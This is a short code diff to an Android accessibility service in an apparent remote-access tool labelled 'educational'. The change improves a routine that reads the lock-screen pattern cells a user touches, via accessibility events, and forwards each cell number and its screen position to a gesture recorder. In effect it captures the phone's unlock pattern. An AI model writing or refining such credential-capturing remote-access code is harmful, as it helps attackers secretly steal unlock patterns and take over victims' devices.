@@ -573,10 +573,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
-     * Recursively walk the accessibility node tree looking for nodes whose
-     * contentDescription (or text) matches "Cell N added" (N = 1-9).
-     * When found, extract the cell number and its on-screen bounds and forward
-     * them to the GestureRecorder.
+     * Recursively walk the accessibility node tree looking for "Cell N added" nodes
+     * that are NOT clickable — these are the cells the user has already touched in the
+     * lock pattern. Clickable "Cell N added" nodes are untouched dots; skip them.
+     * Reports each newly-found touched cell to GestureRecorder with its screen bounds.
      */
     private void scanNodeForAdvancedUnlockCells(AccessibilityNodeInfo node,
             com.remoteaccess.educational.commands.GestureRecorder gr,
@@ -592,7 +592,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         String numStr = s.substring(5, s.length() - 6).trim();
                         int cellNum = Integer.parseInt(numStr);
                         if (cellNum >= 1 && cellNum <= 9
-                                && !reportedThisEvent.contains(cellNum)) {
+                                && !reportedThisEvent.contains(cellNum)
+                                && !node.isClickable()) {
+                            // Non-clickable = user has touched this dot
                             android.graphics.Rect bounds = new android.graphics.Rect();
                             node.getBoundsInScreen(bounds);
                             if (bounds.width() > 0 && bounds.height() > 0) {
